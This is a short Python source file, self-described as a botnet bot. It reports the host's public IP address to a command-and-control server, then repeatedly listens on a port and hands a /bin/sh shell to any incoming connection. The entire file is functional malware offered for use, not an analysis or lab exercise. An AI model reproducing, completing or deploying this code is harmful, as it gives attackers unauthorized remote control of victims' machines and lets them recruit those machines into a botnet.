"""Implementation of a Botnet's Bot."""

from urllib2 import urlopen
from pwn import *

C2 = '127.0.0.1'  # Replace with C2's IP
PORT = 11111
MY_IP = urlopen('http://ip.42.pl/raw').read()

def main():
	"""Receive and execute commands from C2."""
	call_home(C2, PORT)

	while True:
		l = listen(PORT)
		l.wait_for_connection()
		l.spawn_process('/bin/sh')


def call_home(ip, port):
	"""Send this host's IP address to the C2 server.

	Args:
		ip (str): C2's IP address.
		port (int): C2's listening port.
	"""
	r = remote(C2, port)
	home_response = r.recvline() # Hi, what's your IP?
	r.sendline(MY_IP)


if __name__ == "__main__":
	main()